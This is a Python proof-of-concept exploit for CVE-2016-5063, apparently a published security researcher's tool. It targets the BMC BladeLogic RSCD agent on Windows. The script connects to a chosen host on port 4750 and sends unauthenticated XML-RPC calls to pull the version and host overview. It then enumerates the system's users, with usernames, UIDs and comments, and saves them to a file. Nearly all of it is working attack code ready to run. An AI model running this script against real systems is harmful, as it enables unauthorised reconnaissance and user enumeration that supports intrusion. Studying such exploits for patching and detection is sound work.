#!/usr/bin/python3

# Retrieving Windows system users with BMC BladeLogic RSCD agent
# Tested against v8.3.00.64 (Windows version)
# CVE-2016-5063

# Author: Paul Taylor / Foregenix Ltd
# github.com/bao7uo/bmc_bladelogic
# www.foregenix.com/blog

# Latest version, compatible with Python 3.0 and above, by Quentin Fraty

# Credits:
#    Converted to work against Windows version
#    from the Linux BMC getUsers exploit by ERNW

import socket
import ssl
import sys
import requests
import argparse
import xml.etree.ElementTree as ET
import xml.dom.minidom
import httplib2
from requests.packages.urllib3 import PoolManager
from requests.packages.urllib3.connection import HTTPConnection
from requests.packages.urllib3.connectionpool import HTTPConnectionPool
from requests.adapters import HTTPAdapter


class MyHTTPConnection(HTTPConnection):
    def __init__(self, unix_socket_url, timeout=60):
        HTTPConnection.__init__(self, HOST, timeout=timeout)
        self.unix_socket_url = unix_socket_url
        self.timeout = timeout

    def connect(self):
        self.sock = wrappedSocket


class MyHTTPConnectionPool(HTTPConnectionPool):
    def __init__(self, socket_path, timeout=60):
        HTTPConnectionPool.__init__(self, HOST, timeout=timeout)
        self.socket_path = socket_path
        self.timeout = timeout

    def _new_conn(self):
        return MyHTTPConnection(self.socket_path, self.timeout)


class MyAdapter(HTTPAdapter):
    def __init__(self, timeout=60):
        super(MyAdapter, self).__init__()
        self.timeout = timeout

    def get_connection(self, socket_path, proxies=None):
        return MyHTTPConnectionPool(socket_path, self.timeout)

    def request_url(self, request, proxies):
        return request.path_url


def optParser():
    parser = argparse.ArgumentParser(description="Retrieving system users with BMC BladeLogic Server Automation RSCD agent")
    parser.add_argument("host", help="IP address of a target system")
    parser.add_argument("-p", "--port", type=int, default=4750, help="TCP port (default: 4750)")
    opts = parser.parse_args()
    return opts


init = """<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>RemoteServer.intro</methodName><params><param><value>2015-11-19-16-10-30-3920958</value></param><param><value>7</value></param><param><value>0;0;21;AArverManagement_XXX_XXX:XXXXXXXX;2;CM;-;-;0;-;1;1;6;SYSTEM;CP1252;</value></param><param><value>8.6.01.66</value></param></params></methodCall>"""
getVersion = """<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>RemoteServer.getVersion</methodName><params/></methodCall>"""
getWindowsUsers = """<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>RemoteUser.getUserContents</methodName><params><param><value><struct><member><name>typeName</name><value>OS</value></member><member><name>host</name><value>0.0.0.0</value></member><member><name>container</name><value><array><data><value><struct><member><name>string</name><value></value></member><member><name>value</name><value><struct><member><name>longValue</name><value><ex:i8>1</ex:i8></value></member><member><name>kind</name><value><i4>1</i4></value></member></struct></value></member></struct></value></data></array></value></member><member><name>path</name><value>/</value></member></struct></value></param><param><value><i4>1</i4></value></param><param><value><array><data/></array></value></param><param><value><array><data/></array></value></param><param><value><array><data/></array></value></param></params></methodCall>"""
getHostOverview = """<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>RemoteServer.getHostOverview</methodName></methodCall>"""

options = optParser()
PORT = options.port
HOST = options.host

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))

sock.sendall(b"TLSRPC")     # Converted str to binary

wrappedSocket = ssl.wrap_socket(sock)

adapter = MyAdapter()
s = requests.session()
s.mount("http://", adapter)

print("Sending intro...")
r = s.post('http://'+HOST+':'+str(PORT)+'/xmlrpc', data=init)

print("Getting version...")
r = s.post('http://'+HOST+':'+str(PORT)+'/xmlrpc', data=getVersion)

rootVersion = ET.fromstring(r.content)
print("=========================")
print("Major version   : " + rootVersion[0][0][0][0][0][1].text)
print("Minor version   : " + rootVersion[0][0][0][0][1][1].text)
print("Patch version   : " + rootVersion[0][0][0][0][2][1].text)
print("Platform version: " + rootVersion[0][0][0][0][3][1].text)
print("=========================\n")

print("Getting host overview...")
r = s.post('http://'+HOST+':'+str(PORT)+'/xmlrpc', data=getHostOverview)

rootOverview = ET.fromstring(r.content)

linux = False

if rootOverview[0][0][0][0][0][1].text is not None:
    linux = True

print("==================================================")
print("Agent instal dir: " + rootOverview[0][0][0][0][1][1].text)
print("Licensed?       : " + ("false" if (int(rootOverview[0][0][0][0][2][1][0].text) == 0) else "true"))
print("Repeater?       : " + ("false" if (int(rootOverview[0][0][0][0][11][1][0].text) == 0) else "true"))
print("Hostname        : " + rootOverview[0][0][0][0][6][1].text)
print("Netmask         : " + rootOverview[0][0][0][0][12][1].text)
print("CPU architecture: " + rootOverview[0][0][0][0][10][1].text)
print("Platform (OS)   : " + rootOverview[0][0][0][0][13][1].text)
print("OS version      : " + rootOverview[0][0][0][0][14][1].text)
print("OS architecture : " + rootOverview[0][0][0][0][3][1].text)
print("Patch level     : " + rootOverview[0][0][0][0][7][1].text)
print("==================================================\n")



print("Sending request for users...\n")

r = s.post('http://'+HOST+':'+str(PORT)+'/xmlrpc', data=getWindowsUsers)

# New part of the script : formatting the file

x= str(r.content)
data = x[2:len(x)-1]

data = data.replace(r"\r", "")
data = data.replace(r"\n", "")
data = data.replace(r"\t", "")

with open("./users.xml", "w") as text_file:
    # text_file.write(str(r.content))  # previous version, commented out
    text_file.write(data)

# Rewrote the following lines

root = ET.parse('./users.xml').getroot()
count = 0
ind = 1

for c in root[0][0][0][0][0]:
 uid = ""
 username = ""
 comment = ""
 for i in c[0]:
     if "userName" in (i[0].text):
         username += i[1].text
     if "uid" in (i[0].text):
         uid += str(i[1][0].text)
     if "comment" in (i[0].text):
         comment += i[1].text

 print("Username: "+  username)
 print("UID: "+  uid)
 print("Comment: "+  comment)
 print("---")
 count += 1

print("Number of users found: " + str(count) + "\n")
wrappedSocket.close()
